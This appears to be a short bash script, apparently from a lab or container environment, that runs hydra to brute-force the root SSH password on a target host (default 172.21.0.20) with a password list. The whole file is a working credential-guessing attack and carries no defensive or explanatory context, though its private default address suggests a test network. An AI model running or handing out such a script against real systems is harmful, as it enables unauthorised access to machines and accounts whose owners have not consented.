#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-172.21.0.20}"
PASS_FILE="${2:-/scripts/passwords.txt}"
hydra -l root -P "$PASS_FILE" -t 4 "ssh://$TARGET"
